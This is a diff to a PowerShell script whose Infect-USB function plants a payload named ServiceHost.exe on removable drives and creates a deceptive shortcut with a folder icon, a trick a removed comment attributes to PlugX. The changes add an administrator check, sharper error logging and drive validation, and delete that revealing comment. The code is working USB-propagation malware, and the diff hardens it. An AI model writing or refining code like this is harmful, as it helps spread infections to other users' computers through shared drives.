@@ -6,6 +6,17 @@ $logPath = "C:\Windows\Temp\boot_execution_log.txt"
 $crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
 $crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
 
+function Is-Admin {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (-not (Is-Admin)) {
+    Add-Content -Path $logPath -Value "ERROR: Script not running with Administrator privileges. Exiting."
+    exit
+}
+
 function Infect-USB {
     param ($DriveLetter)
     $usbPath = "$DriveLetter\"
@@ -39,15 +50,17 @@ function Infect-USB {
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnkPath)
         $shortcut.TargetPath = "$usbSoftwareFolder\SystemCore\ServiceHost.exe"
-        $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2" # Mimics PlugX folder icon deception
+        $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2"
         $shortcut.WorkingDirectory = "$usbSoftwareFolder\SystemCore"
         $shortcut.Save()
         Add-Content -Path $logPath -Value "Created deceptive shortcut at $lnkPath pointing to $usbSoftwareFolder\SystemCore\ServiceHost.exe"
     } catch {
-        Add-Content -Path $logPath -Value "Failed to infect USB at $usbPath. Error: $_"
+        Add-Content -Path $logPath -Value "Failed to infect USB at $usbPath. Error: $($_.Exception.Message)"
     }
 }
 
-if ($DriveLetter) {
+if ($DriveLetter -and (Test-Path $DriveLetter)) {
     Infect-USB -DriveLetter $DriveLetter
+} else {
+    Add-Content -Path $logPath -Value "Invalid or missing DriveLetter parameter. Exiting."
 }
